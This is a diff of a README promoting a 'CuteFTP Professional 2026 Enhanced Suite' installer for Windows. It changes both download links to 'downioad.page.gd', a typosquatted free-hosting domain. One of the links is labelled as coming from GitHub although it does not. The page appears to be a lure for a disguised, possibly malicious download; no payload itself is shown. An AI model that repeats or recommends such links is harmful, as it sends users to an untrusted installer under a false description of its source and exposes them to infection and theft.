@@ -2,7 +2,7 @@
 
 CuteFTP Professional 2026 Enhanced Suite is a top-tier FTP client designed for Windows users who need efficient and secure file transfers. This tool offers a suite of features to enhance your FTP experience, making it ideal for both personal and professional use. Updated in 2026, it provides the latest enhancements for seamless connectivity and reliability.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -62,7 +62,7 @@ Yes, CuteFTP Professional 2026 Enhanced Suite is designed for both personal and 
 
 For the latest version of CuteFTP Professional 2026 Enhanced Suite, click the link below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
